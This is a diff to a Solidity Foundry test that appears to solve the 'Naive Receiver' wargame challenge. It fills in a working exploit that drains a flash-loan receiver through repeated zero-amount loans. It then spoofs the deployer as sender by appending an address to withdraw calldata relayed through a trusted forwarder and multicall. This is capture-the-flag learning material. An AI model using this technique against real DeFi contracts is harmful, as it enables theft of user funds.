@@ -56,6 +56,7 @@ contract NaiveReceiverChallenge is Test {
         // Check initial balances
         assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
         assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);
+        assertEq(pool.deposits(address(deployer)), WETH_IN_POOL);
 
         // Check pool config
         assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
@@ -77,7 +78,31 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory batch = new bytes[](11);
+
+        for (uint256 i = 0; i < 10; i++) {
+            batch[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, ""));
+        }
+
+        bytes memory payload =
+            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)));
+        payload = abi.encodePacked(payload, deployer);
+
+        batch[10] = payload;
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1_000_000,
+            nonce: 0,
+            data: abi.encodeCall(Multicall.multicall, (batch)),
+            deadline: block.timestamp + 1 hours
+        });
+        bytes32 digest = forwarder.getDigest(request);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        forwarder.execute(request, abi.encodePacked(r, s, v));
+        console.log("recovery weth balance: ", weth.balanceOf(recovery));
     }
 
     /**
